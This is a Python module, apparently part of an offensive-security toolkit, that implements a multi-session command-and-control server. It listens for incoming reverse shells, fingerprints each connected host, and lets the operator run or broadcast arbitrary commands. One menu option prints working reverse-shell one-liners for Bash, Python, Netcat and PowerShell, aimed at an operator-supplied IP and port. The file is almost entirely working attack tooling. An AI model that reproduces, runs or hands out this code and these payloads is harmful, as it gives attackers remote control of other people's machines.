"""C2 (Command & Control) — Lightweight multi-session shell manager.

Manage multiple reverse shells from one dashboard. NOT a full C2 framework
like Cobalt Strike — this is a lightweight terminal-based shell manager.
"""

import sys
import os
import socket
import threading
import json
import time
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm)

# ─── Shell Session Manager ────────────────────────────────────────────────────

class ShellSession:
    """Represents a single reverse shell connection."""

    def __init__(self, conn, addr, session_id):
        self.conn = conn
        self.addr = addr
        self.id = session_id
        self.connected_at = datetime.now()
        self.last_active = datetime.now()
        self.os_info = "Unknown"
        self.hostname = "Unknown"
        self.alive = True
        self.history = []

    def send_command(self, cmd):
        """Send command and receive response."""
        try:
            self.conn.send((cmd + "\n").encode())
            self.conn.settimeout(10)
            response = b""
            while True:
                try:
                    chunk = self.conn.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
                except socket.timeout:
                    break

            self.last_active = datetime.now()
            result = response.decode(errors='replace')
            self.history.append({"cmd": cmd, "output": result, "time": datetime.now().isoformat()})
            return result

        except (ConnectionResetError, BrokenPipeError, OSError):
            self.alive = False
            return "[Connection lost]"

    def identify(self):
        """Try to identify the remote system."""
        whoami = self.send_command("whoami")
        hostname = self.send_command("hostname")
        uname = self.send_command("uname -a 2>/dev/null || ver")

        self.hostname = hostname.strip() if hostname else "Unknown"
        self.os_info = uname.strip()[:80] if uname else "Unknown"

        return f"{whoami.strip()}@{self.hostname}"

    def close(self):
        """Close the connection."""
        self.alive = False
        try:
            self.conn.close()
        except Exception:
            pass

    def info_str(self):
        status = "[green]ALIVE[/green]" if self.alive else "[red]DEAD[/red]"
        return (f"[{self.id}] {status} {self.addr[0]}:{self.addr[1]} "
                f"({self.hostname}) — {self.connected_at.strftime('%H:%M:%S')}")


class C2Server:
    """Multi-session C2 server."""

    def __init__(self):
        self.sessions = {}
        self.listener_threads = []
        self.next_id = 1
        self.running = False
        self.listeners = []

    def start_listener(self, port, bind_addr="0.0.0.0"):
        """Start a listener on the given port."""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((bind_addr, port))
            server.listen(5)
            server.settimeout(2)

            self.listeners.append({"socket": server, "port": port, "active": True})
            self.running = True

            thread = threading.Thread(
                target=self._accept_loop,
                args=(server, port),
                daemon=True
            )
            thread.start()
            self.listener_threads.append(thread)

            success(f"Listener started on {bind_addr}:{port}")
            return True

        except OSError as e:
            error(f"Failed to start listener on port {port}: {e}")
            return False

    def _accept_loop(self, server, port):
        """Accept incoming connections."""
        while self.running:
            try:
                conn, addr = server.accept()
                session_id = self.next_id
                self.next_id += 1

                shell = ShellSession(conn, addr, session_id)

                # Try to identify
                try:
                    identity = shell.identify()
                    console.print(f"\n  [bold green][+] New shell #{session_id}: "
                                  f"{addr[0]}:{addr[1]} ({identity})[/bold green]")
                except Exception:
                    console.print(f"\n  [bold green][+] New shell #{session_id}: "
                                  f"{addr[0]}:{addr[1]}[/bold green]")

                self.sessions[session_id] = shell

            except socket.timeout:
                continue
            except OSError:
                break

    def interact(self, session_id):
        """Interactive shell with a session."""
        shell = self.sessions.get(session_id)
        if not shell or not shell.alive:
            error(f"Session {session_id} is not available.")
            return

        console.print(f"\n[bold cyan]Interacting with session #{session_id} "
                      f"({shell.addr[0]})[/bold cyan]")
        console.print("[dim]Type 'bg' to background, 'exit' to close session[/dim]\n")

        while shell.alive:
            try:
                cmd = input(f"({shell.hostname})> ")
            except (EOFError, KeyboardInterrupt):
                console.print()
                break

            if cmd.strip() == "bg":
                info("Session backgrounded.")
                return
            elif cmd.strip() == "exit":
                shell.close()
                info(f"Session #{session_id} closed.")
                return
            elif cmd.strip() == "":
                continue

            output = shell.send_command(cmd)
            if output:
                print(output, end="")

    def broadcast(self, cmd):
        """Send a command to all active sessions."""
        results = {}
        for sid, shell in self.sessions.items():
            if shell.alive:
                info(f"[Session #{sid}] Running: {cmd}")
                output = shell.send_command(cmd)
                results[sid] = output
                console.print(f"  [dim]{output}[/dim]")
        return results

    def list_sessions(self):
        """List all sessions."""
        if not self.sessions:
            info("No active sessions.")
            return

        console.print("\n[bold cyan]Active Sessions:[/bold cyan]\n")
        for sid, shell in self.sessions.items():
            console.print(f"  {shell.info_str()}")
        console.print()

    def kill_session(self, session_id):
        """Kill a specific session."""
        shell = self.sessions.get(session_id)
        if shell:
            shell.close()
            success(f"Session #{session_id} killed.")
        else:
            error(f"Session {session_id} not found.")

    def stop_all(self):
        """Stop all listeners and close all sessions."""
        self.running = False
        for shell in self.sessions.values():
            shell.close()
        for listener in self.listeners:
            try:
                listener["socket"].close()
            except Exception:
                pass
        self.listeners.clear()
        success("All listeners stopped and sessions closed.")


# ─── Singleton ────────────────────────────────────────────────────────────────

_c2 = None

def get_c2():
    global _c2
    if _c2 is None:
        _c2 = C2Server()
    return _c2


# ─── Menu ─────────────────────────────────────────────────────────────────────

def run(session):
    show_stage_header("C2 Command & Control", "Manage multiple reverse shell sessions")

    c2 = get_c2()

    while True:
        # Status line
        active = sum(1 for s in c2.sessions.values() if s.alive)
        listeners = len([l for l in c2.listeners if l["active"]])
        console.print(f"  [dim]Listeners: {listeners} | Sessions: {active}[/dim]\n")

        options = [
            ("1", "Start Listener"),
            ("2", "List Sessions"),
            ("3", "Interact with Session"),
            ("4", "Broadcast Command (to all sessions)"),
            ("5", "Kill Session"),
            ("6", "Generate Payload for Listener"),
            ("7", "Stop All Listeners"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            if active > 0:
                info(f"{active} sessions still active. C2 runs in background.")
            return
        elif choice == "1":
            port = int(ask("Listener port", default="4444"))
            c2.start_listener(port)
        elif choice == "2":
            c2.list_sessions()
        elif choice == "3":
            if not c2.sessions:
                warning("No sessions available.")
                continue
            c2.list_sessions()
            sid = int(ask("Session ID to interact with"))
            c2.interact(sid)
        elif choice == "4":
            if not c2.sessions:
                warning("No sessions available.")
                continue
            cmd = ask("Command to broadcast")
            c2.broadcast(cmd)
        elif choice == "5":
            c2.list_sessions()
            sid = int(ask("Session ID to kill"))
            c2.kill_session(sid)
        elif choice == "6":
            port = ask("Listener port", default="4444")
            lhost = ask("Your IP")
            console.print(f"\n[bold cyan]Quick payloads for {lhost}:{port}:[/bold cyan]\n")
            payloads = {
                "Bash": f"bash -i >& /dev/tcp/{lhost}/{port} 0>&1",
                "Python": f"python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"{lhost}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "Netcat": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f",
                "PowerShell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}\"",
            }
            for name, payload in payloads.items():
                console.print(f"  [yellow]{name}:[/yellow]")
                console.print(f"  [white]{payload}[/white]\n")
        elif choice == "7":
            c2.stop_all()
